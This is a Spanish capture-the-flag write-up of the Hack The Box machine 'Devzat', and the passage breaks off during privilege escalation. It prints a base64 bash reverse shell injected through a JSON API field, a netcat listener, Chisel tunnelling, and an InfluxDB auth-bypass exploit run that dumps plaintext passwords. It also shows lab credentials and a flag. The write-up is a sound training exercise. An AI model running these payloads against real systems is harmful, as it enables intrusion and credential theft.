---
layout: post
title: Devzat - WriteUp
author: WildZarek
permalink: /htb/devzat
excerpt: "Máquina Linux de dificultad media en la que tocamos varias técnicas y una buena cantidad de enumeración. Explotamos un par de vulnerabilidades: ejecución remota de comandos y CVE para la base de datos. Lo que menos me ha gustado ha sido la 'escalada de privilegios', que fue demasiado simple."
description: "Máquina Linux de dificultad media en la que tocamos varias técnicas y una buena cantidad de enumeración. Explotamos un par de vulnerabilidades: ejecución remota de comandos y CVE para la base de datos. Lo que menos me ha gustado ha sido la 'escalada de privilegios', que fue demasiado simple."
date: 2022-03-13
header:
  teaser: /assets/images/hackthebox/machines/devzat.png
  teaser_home_page: true
  icon: /assets/images/hackthebox/htb_icon_original.png
categories: [HackTheBox, Pentesting, BurpSuite, Exploiting, Port Forwarding, Pivoting, Privilege Escalation]
tags: [API, GIT, SOURCE CODE REVIEW, RCE, SSH, INFLUXDB, CVE, BYPASS, SQL]
---

<p align="center"><img src="/assets/images/hackthebox/machines/devzat.png"></p>

Saludos pentesters, volvemos a la carga con otra máquina Linux de dificultad media, vamos a meternos de lleno en materia a ver qué tal resulta.

## Fecha de Resolución

<p align="center"><a href="https://www.hackthebox.com/achievement/machine/18979/398"><img src="/assets/images/hackthebox/machines/devzat/pwned_date.png"></a></p>

## Fase de Reconocimiento

Asignamos un virtualhost a la máquina en el archivo **`/etc/hosts`** para mayor comodidad.

```console
p3ntest1ng:~$ echo '10.10.11.118 devzat.htb' | sudo tee -a /etc/hosts
```

Recordad que esto siempre es el mismo procedimiento, **`TCP SYN Port Scan`** y pa' lante.

| Parámetro  | Descripción |
| ---------- | :---------- |
| -p-        | Escanea el rango completo de puertos (hasta el 65535)    |
| -sS        | Realiza un escaneo de tipo SYN port scan                 |
| --min-rate | Enviar paquetes no más lentos que 5000 por segundo       |
| --open     | Mostrar sólo los puertos que esten abiertos              |
| -vvv       | Triple verbose para ver en consola los resultados        |
| -n         | No efectuar resolución DNS                               |
| -Pn        | No efectuar descubrimiento de hosts                      |
| -oG        | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
p3ntest1ng:~$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.118 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 21:22 CET
Initiating SYN Stealth Scan at 21:22
Scanning 10.10.11.118 [65535 ports]
SYN Stealth Scan Timing: About 50.00% done; ETC: 21:24 (0:00:52 remaining)
Discovered open port 80/tcp on 10.10.11.118
Discovered open port 22/tcp on 10.10.11.118
Discovered open port 8000/tcp on 10.10.11.118
Completed SYN Stealth Scan at 21:24, 139.09s elapsed (65535 total ports)
Nmap scan report for 10.10.11.118
Host is up, received user-set (0.23s latency).
Scanned at 2022-01-03 21:22:16 CET for 139s
Not shown: 52972 filtered tcp ports (no-response), 12560 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 139.26 seconds
           Raw packets sent: 124787 (5.491MB) | Rcvd: 12565 (502.620KB)
```

Identificamos tres puertos abiertos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)** - SSH o Secure Shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)** - Servidor web |
| 8000   | De momento nos lo marca como HTTP Alternate |

Realizamos un escaneo específico sobre los puertos abiertos que hemos encontrado.

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
p3ntest1ng:~$ nmap -sCV -p 22,80,8000 10.10.11.118 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 21:31 CET
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: devzat - where the devs at
8000/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=1/3%Time=61D35D25%P=x86_64-pc-linux-gnu%r(NUL
SF:L,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.77 seconds
```

Vemos que hay un servicio web corriendo bajo el puerto **80** así que vamos a tratar obtener más información con un script de reconocimiento HTTP básico de Nmap.
Además, ya sabemos que el puerto **8000** en realidad es un aplicativo corriendo bajo el nombre **`SSH-2.0-Go`**

| Parámetro | Descripción |
| --------- | :---------- |
| --script  | Ejecución de scripts escritos en LUA. Usamos **http-enum** |
| -p        | Escanea sobre el puerto especificado |
| -oN       | Guarda el output en un archivo con formato normal |

```console
p3ntest1ng:~$ sudo nmap --script http-enum -p 80 10.10.11.118 -oN webScan

Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 21:34 CET
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.042s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /README.txt: Interesting, a readme.
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 5.32 seconds
```

Analicemos con **`whatweb`** esta página para ver qué tecnologías se utilizan.

```console
p3ntest1ng:~$ whatweb http://devzat.htb/
http://devzat.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[patrick@devzat.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.118], JQuery, Script, Title[devzat - where the devs at]
```

**`patrick`** podría ser un usuario potencial, lo tendremos en cuenta. Veamos la página en el navegador para ver si podemos encontrar algún posible vector de entrada.

![Website](/assets/images/hackthebox/machines/devzat/website.png)

Llegando al final de la página observamos que nos dan un acceso al proyecto, el cual se trata de un chat sobre SSH bajo el puerto 8000.

![Conexión](/assets/images/hackthebox/machines/devzat/connection.png)

Así que vamos a conectarnos para ver qué podemos hacer.

```console
p3ntest1ng:~$ ssh -l wildzarek devzat.htb -p 8000

wildzarek: /help
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM] 
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM] 
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM] 
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM] 
[SYSTEM] For a list of commands run
[SYSTEM] ┃ /commands
wildzarek: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
wildzarek: 
```

Después de un rato probando comandos no he conseguido ninguna información relevante. ¿Podemos conectarnos como el usuario **`patrick`** a este servicio?

```console
p3ntest1ng:~$ ssh -l patrick devzat.htb -p 8000
Nickname reserved for local use, please choose a different one.
```

Pues al parecer sí existe el usuario, pero no podemos utilizar su nombre. Volvamos a analizar la página. Podemos buscar subdominios, algo que no habíamos hecho antes.

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Mostrar el output en formato colorizado |
| -w        | Utiliza el diccionario especificado |
| --sc 200  | Muestra sólo los códigos de estado 200 |
| -H        | Realiza una consulta de tipo header |
| -u        | Especifica la URL para la consulta |
| -t        | Nos permite lanzar el comando con N threads |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --sc 200 -H "Host: FUZZ.devzat.htb" -u http://devzat.htb -t 50 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devzat.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000003745:   200        20 L     35 W       510 Ch      "pets"                                                                                                                      

Total time: 300.5298
Processed Requests: 114441
Filtered Requests: 114440
Requests/sec.: 380.7974
```

Encontramos un subdominio accesible así que lo añadimos a nuestro archivo **`/etc/hosts`** para poder acceder al mismo.

![Subdominio](/assets/images/hackthebox/machines/devzat/subdomain.png)

Parece que podemos guardar una nueva mascota en este inventario. Veamos cómo se envía la petición con **`BurpSuite`**

![BurpSuite](/assets/images/hackthebox/machines/devzat/burpsuite1.png)

La petición se realiza mediante **POST** al endpoint **`/api/pet`** en formato **JSON**:

```json
{
  "name":"Jerry",
  "species":"dog"
}
```

En primer lugar vamos a comprobar si existen directorios interesantes en este subdominio.

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt --hc 200 http://pets.devzat.htb/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://pets.devzat.htb/FUZZ
Total requests: 43003

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000021:   301        2 L      3 W        40 Ch       "css"                                                                                                                       
000001767:   301        2 L      3 W        42 Ch       "build"                                                                                                                     
000004659:   403        9 L      28 W       280 Ch      "server-status"                                                                                                             
000005919:   301        2 L      3 W        41 Ch       ".git"                                                                                                                      

Total time: 419.9448
Processed Requests: 43003
Filtered Requests: 42999
Requests/sec.: 102.4015
```

## Fase de Explotación

Encuentro un directorio **`.git`**, podemos descargarlo con **`wget`** a nuestra máquina para analizarlo.

![Git](/assets/images/hackthebox/machines/devzat/git.png)

```console
p3ntest1ng:~$ wget --recursive --no-parent http://pets.devzat.htb/.git/
```

Ahora que tenemos el directorio, podemos utilizar **`GitTools`** para extraer los commits.
Para ello nos clonamos el siguiente repositorio: https://github.com/internetwache/GitTools

```console
p3ntest1ng:~$ git clone https://github.com/internetwache/GitTools
```

Una vez clonado, nos metemos en el directorio **`GitTools/Extractor`** y ejecutamos el script **`extractor.sh`**

```console
p3ntest1ng:~$ ./extractor.sh ../../content/.git ../../content/dump
```

Tardará un rato en extraer toda la información, pero una vez finalice tendremos acceso a los commits y por tanto al código fuente.

```console
p3ntest1ng:~$ cd ../../content/dump && ll
drwxrwx--- root vboxsf 4.0 KB Mon Jan 24 01:43:40 2022  0-464614f32483e1fde60ee53f5d3b4d468d80ff62
drwxrwx--- root vboxsf 4.0 KB Mon Jan 24 01:43:47 2022  1-8274d7a547c0c3854c074579dfc359664082a8f6
drwxrwx--- root vboxsf 4.0 KB Mon Jan 24 01:43:51 2022  2-ef07a04ebb2fc92cf74a39e0e4b843630666a705

p3ntest1ng:~$ cd 0-464614f32483e1fde60ee53f5d3b4d468d80ff62/ && ll
drwxrwx--- root vboxsf 4.0 KB Mon Jan 24 01:43:38 2022  characteristics
drwxrwx--- root vboxsf 4.0 KB Mon Jan 24 01:43:43 2022  static
.rwxrwx--- root vboxsf 223 B  Mon Jan 24 01:43:37 2022  commit-meta.txt
.rwxrwx--- root vboxsf  88 B  Mon Jan 24 01:43:38 2022  go.mod
.rwxrwx--- root vboxsf 163 B  Mon Jan 24 01:43:39 2022  go.sum
.rwxrwx--- root vboxsf 4.3 KB Mon Jan 24 01:43:39 2022  main.go
.rwxrwx--- root vboxsf 9.5 MB Mon Jan 24 01:43:40 2022  petshop
.rwxrwx--- root vboxsf 123 B  Mon Jan 24 01:43:40 2022  start.sh
```

La API está construida con Go, vamos a revisar brevemente el archivo **`main.go`**, el código contiene muchas líneas así que os pongo sólo la parte interesante:

```Go
func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}
```

No entiendo mucho de Go, pero el código se puede entender fácilmente si has manejado otros lenguajes como Python.
Básicamente en esta función vemos que se ejecuta un comando a nivel de sistema, haciendo uso de la librería **`os/exec`** importada al inicio del script.
Vemos que con **`exec.Command`** se lanza el comando **`sh -c cat characteristics/`** seguido del valor **`species`**, que es básicamente un string en formato JSON.
Lo interesante de esto es que podría ser vulnerable a [Remote Code Execution (RCE)](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html), vamos a enviar una petición POST maliciosa para tratar de obtener una shell inversa.
Primero vamos a codificar nuestro comando en Base64 para evadir posibles filtros:

```console
p3ntest1ng:~$ echo "bash -i >& /dev/tcp/10.10.15.113/9999 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMTMvOTk5OSAwPiYxCg==
```

Nuestra petición tendrá este aspecto (el punto y coma antes del echo es importante para que interprete la orden):

```json
{
  "name":"pwned",
  "species":";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMTMvOTk5OSAwPiYxCg== | base64 -d | bash"
}
```

Nos ponemos en escucha con **`nc -nlvp 9999`** y lanzamos la petición con **`BurpSuite`**:

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
```

Le damos a **`Forward`** y nos debería entablar la conexión...

![BurpSuite](/assets/images/hackthebox/machines/devzat/burpsuite2.png)

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.15.113] from (UNKNOWN) [10.10.11.118] 43722
bash: cannot set terminal process group (871): Inappropriate ioctl for device
bash: no job control in this shell
patrick@devzat:~/pets$ 
```

Como curiosidad, si observamos la página vemos que se ha producido un error al tramitar nuestra petición:

![JSON Error](/assets/images/hackthebox/machines/devzat/json_error.png)

Vamos a realizar un tratamiento a la shell para mayor comodidad, recordad que esto siempre es recomendable hacerlo:

```console
patrick@devzat:~/pets$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
patrick@devzat:~/pets$ ^Z
zsh: suspended  nc -nlvp 9999
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 9999
                               reset xterm
patrick@devzat:~/pets$ export TERM=xterm
patrick@devzat:~/pets$ export SHELL=bash
patrick@devzat:~/pets$ stty rows 43 columns 189
```

Una vez realizado, ya podemos hacer Ctrl+C, Ctrl+L, etc. Veamos si podemos leer la flag de usuario.

```console
patrick@devzat:/home$ whoami && id
patrick
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)
patrick@devzat:~/pets$ cd /home
patrick@devzat:/home$ ls
catherine  patrick
patrick@devzat:/home$ ls patrick
devzat  go  pets
```

Parece que en el directorio del usuario **`patrick`** no encontramos el archivo que buscamos, 
pero como vimos antes, existe otro usuario llamado **`catherine`**, comprobemos si tiene el archivo.

```console
patrick@devzat:/home$ ls catherine
user.txt
```

Efectivamente, necesitamos convertirnos en **catherine** para poder leer la flag. Podemos ver si existen otros servicios bajo localhost que no hayamos podido listar anteriormente.

```console
patrick@devzat:/home$ netstat -punta
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      882/./petshop       
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0    286 10.10.11.118:43886      10.10.15.113:9999       ESTABLISHED 69555/bash          
tcp        0      1 10.10.11.118:32916      1.1.1.1:53              SYN_SENT    -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      881/./devchat       
udp        0      0 127.0.0.1:42865         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
```

Bingo, descubrimos varios puertos abiertos, descartamos el **5000** porque ya vimos en el código fuente que pertenece a la API y no nos interesa.
Sin embargo, tenemos el puerto **`8086`** y el **`8443`**. Tras una breve búsqueda en Google, encuentro algo interesante: [8086 - Pentesting InfluxDB](https://book.hacktricks.xyz/pentesting/8086-pentesting-influxdb)

Pero antes de meternos de lleno con InfluxDB, vamos a centrarnos en el puerto 8443.
Al principio nos daban acceso para probar la aplicación, probemos a conectarnos de igual modo pero al puerto indicado y como el usuario **`patrick`** (este nombre de usuario estaba reservado para uso local).

```console
patrick@devzat:/home$ ssh -l patrick devzat.htb -p 8443
```

![DevChat](/assets/images/hackthebox/machines/devzat/devchat1.png)

Observamos un mensaje interno del administrador explicando que ha intalado la versión **`1.7.5`** de InfluxDB. Si volvemos a la página encontrada anteriormente, vemos que mencionan una vulnerabilidad:

> There was a vulnerability influxdb that allowed to bypass the authentication: [CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)

Visitamos el enlace y nos explica que efectivamente las versiones inferiores a **`1.7.6`** son vulnerables.

Nos clonamos el repositorio en nuestra máquina e instalamos las dependencias con **`pip install -r requirements`**.
También necesitamos descargar [Chisel](https://github.com/jpillora/chisel) (si no lo tenemos) para realizar [Port-Forwarding](https://es.wikipedia.org/wiki/Redirecci%C3%B3n_de_puertos)

```console
p3ntest1ng:~$ git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
Clonando en 'InfluxDB-Exploit-CVE-2019-20933'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 27 (delta 8), reused 4 (delta 0), pack-reused 0
Recibiendo objetos: 100% (27/27), 7.94 KiB | 813.00 KiB/s, listo.
Resolviendo deltas: 100% (8/8), listo.
p3ntest1ng:~$ cd InfluxDB-Exploit-CVE-2019-20933/
p3ntest1ng:~$ pip install -r requirements.txt
```

Una vez tengamos listo el exploit, levantamos un servidor tunelizado con **`Chisel`**

```console
p3ntest1ng:~$ chisel server -p 9999 --reverse
2022/01/24 07:42:59 server: Reverse tunnelling enabled
2022/01/24 07:42:59 server: Fingerprint wZAOi31QDp7a44JtK3nepyKtFi9NPsajWkV5E2qpouo=
2022/01/24 07:42:59 server: Listening on http://0.0.0.0:9999
```

Nos descargamos en nuestra máquina la última release de **`Chisel`** desde su Github y levantamos un servidor http:

```console
p3ntest1ng:~$ sudo python3 -m http.server 80
```

En la máquina Devzat nos creamos un directorio en **`/tmp`** con el nombre que queramos.
Nos descargamos el archivo, lo descomprimimos, le damos permisos de ejecución y nos conectamos al servidor tunelizado que levantamos anteriormente:

```console
patrick@devzat:~$ cd /tmp && mkdir any0ne; cd any0ne
patrick@devzat:/tmp/any0ne$ wget http://10.10.15.113/chisel_1.7.6_linux_amd64.gz
--2022-01-24 07:09:00--  http://10.10.15.113/chisel_1.7.6_linux_amd64.gz
Connecting to 10.10.15.113:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3288156 (3.1M) [application/gzip]
Saving to: ‘chisel_1.7.6_linux_amd64.gz’

chisel_1.7.6_linux_amd64.gz     100%[==================>]   3.14M  3.03MB/s    in 1.0s    

2022-01-24 07:09:02 (3.03 MB/s) - ‘chisel_1.7.6_linux_amd64.gz’ saved [3288156/3288156]
patrick@devzat:/tmp/any0ne$ gunzip chisel_1.7.6_linux_amd64.gz
patrick@devzat:/tmp/any0ne$ chmod +x chisel_1.7.6_linux_amd64
patrick@devzat:/tmp/any0ne$ mv chisel_1.7.6_linux_amd64 chisel
patrick@devzat:/tmp/any0ne$ ./chisel client 10.10.15.113:9999 R:8086:127.0.0.1:8086
2022/01/24 07:20:17 client: Connecting to ws://10.10.15.113:9999
2022/01/24 07:20:18 client: Connected (Latency 48.760893ms)
```

Ya tenemos todo listo para ejecutar el exploit desde nuestra máquina:

```console
p3ntest1ng:~$ python3 __main__.py
  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
CVE-2019-20933

Insert ip host (default localhost): 
Insert port (default 8086): 
Insert influxdb user (wordlist path to bruteforce username): /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt

Start username bruteforce
[x] root
[v] admin

Host vulnerable !!!
Databases list:

1) devzat
2) _internal

Insert database name (exit to close): devzat
[devzat] Insert query (exit to change db): show measurements
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
devzat] Insert query (exit to change db): show series;
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "key"
                    ],
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
[devzat] Insert query (exit to change db): select * from "user";
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Tenemos las credenciales de los usuarios, por lo cual ya podemos identificarnos como **`catherine`** y leer la flag.

```console
patrick@devzat:~$ su catherine
Password: woBeeYareedahc7Oogeephies7Aiseci
catherine@devzat:/home/patrick$ cd
catherine@devzat:~$ cat user.txt 
52ac9d081445b06ca9f96ac9ef9b2d7c
```

## Escalada de Privilegios

Como siempre, lo primero que hago es comprobar permisos a nivel de sudo:

```console
catherine@devzat:~$ sudo -l
[sudo] password for catherine: 
Sorry, user catherine may not run sudo on devzat.
catherine@devzat:~$ sudo -i
[sudo] password for catherine: 
catherine is not in the sudoers file.  This incident will be reported.
```

Pero en esta ocasión no tenemos permiso para ejecutar sudo. Cuidao que se tensa...
En este punto se me ocurre repetir lo mismo que hicimos con el usuario **`patrick`**, conectarnos al DevChat como **`catherine`** para ver si también encontramos alguna pista.

```console
catherine@devzat:~$ ssh -l catherine devzat.htb -p 8443
```

![DevChat](/assets/images/hackthebox/machines/devzat/devchat2.png)

En esta ocasión vemos que hablan sobre una nueva funcionalidad en el servicio del puerto **`8443`**, también nos indica dónde encontraremos la contraseña necesaria y que el código se encuentra en el directorio por defecto de backups.
Incluso nos da una pista muy clara donde nos dice que podemos hacer **`diff main dev`** para ver las diferencias entre ambas ramas del proyecto. Echemos un ojo a todo esto.

```console
catherine@devzat:~$ locate backups
/snap/core18/2074/var/backups
/snap/core18/2128/var/backups
/var/backups
/var/backups/alternatives.tar.0
/var/backups/apt.extended_states.0
/var/backups/apt.extended_states.1.gz
/var/backups/apt.extended_states.2.gz
/var/backups/devzat-dev.zip
/var/backups/devzat-main.zip
/var/backups/dpkg.diversions.0
/var/backups/dpkg.statoverride.0
/var/backups/dpkg.status.0
catherine@devzat:~$  cd /var/backups
catherine@devzat:/var/backups$ ls -la
total 1132
drwxr-xr-x  2 root      root        4096 Jan 24 06:25 .
drwxr-xr-x 14 root      root        4096 Jun 22  2021 ..
-rw-r--r--  1 root      root       51200 Jan 24 06:25 alternatives.tar.0
-rw-r--r--  1 root      root       59142 Sep 28 18:45 apt.extended_states.0
-rw-r--r--  1 root      root        6588 Sep 21 20:17 apt.extended_states.1.gz
-rw-r--r--  1 root      root        6602 Jul 16  2021 apt.extended_states.2.gz
-rw-------  1 catherine catherine  28297 Jul 16  2021 devzat-dev.zip
-rw-------  1 catherine catherine  27567 Jul 16  2021 devzat-main.zip
-rw-r--r--  1 root      root         268 Sep 29 11:46 dpkg.diversions.0
-rw-r--r--  1 root      root         170 Jul 16  2021 dpkg.statoverride.0
-rw-r--r--  1 root      root      951869 Sep 28 18:45 dpkg.status.0
```

Tal y como vimos en la conversación, tenemos archivos principales y en desarrollo, nos descargamos los .zip a nuestra máquina para analizarlos mejor.

```console
p3ntest1ng:~$ wget http://devzat.htb:9999/devzat-dev.zip
p3ntest1ng:~$ wget http://devzat.htb:9999/devzat-main.zip
```

```console
catherine@devzat:/var/backups$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
10.10.15.113 - - [24/Jan/2022 08:13:13] "GET /devzat-dev.zip HTTP/1.1" 200 -
10.10.15.113 - - [24/Jan/2022 08:13:24] "GET /devzat-main.zip HTTP/1.1" 200 -
```

Veamos las diferencias entre estas dos ramas (recomiendo abrir la imagen en una nueva pestaña para verla mejor):

![Git Diff](/assets/images/hackthebox/machines/devzat/git_diff.png)

Podemos observar que hay una nueva función que lee el archivo que le indiquemos, proporcionando la contraseña de usuario, que está escrita en el código en texto plano.

```
+func fileCommand(u *user, args []string) {
+       if len(args) < 1 {
+               u.system("Please provide file to print and the password")
+               return
+       }
+
+       if len(args) < 2 {
+               u.system("You need to provide the correct password to use this function")
+               return
+       }
+
+       path := args[0]
+       pass := args[1]
+
+       // Check my secure password
+       if pass != "CeilingCatStillAThingIn2021?" {
+               u.system("You did provide the wrong password")
+               return
+       }
+
+       // Get CWD
+       cwd, err := os.Getwd()
+       if err != nil {
+               u.system(err.Error())
+       }
+
+       // Construct path to print
+       printPath := filepath.Join(cwd, path)
+
+       // Check if file exists
+       if _, err := os.Stat(printPath); err == nil {
+               // exists, print
+               file, err := os.Open(printPath)
+               if err != nil {
+                       u.system(fmt.Sprintf("Something went wrong opening the file: %+v", err.Error()))
+                       return
+               }
+               defer file.Close()
+
+               scanner := bufio.NewScanner(file)
+               for scanner.Scan() {
+                       u.system(scanner.Text())
+               }
+
+               if err := scanner.Err(); err != nil {
+                       u.system(fmt.Sprintf("Something went wrong printing the file: %+v", err.Error()))
+               }
+
+               return
+
+       } else if os.IsNotExist(err) {
+               // does not exist, print error
+               u.system(fmt.Sprintf("The requested file @ %+v does not exist!", printPath))
+               return
+       }
+       // bokred?
+       u.system("Something went badly wrong.")
 }
```

Volvamos a conectarnos al DevChat para probar el nuevo comando.

```console
catherine@devzat:~$ ssh -l catherine devzat.htb -p 8443
catherine: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
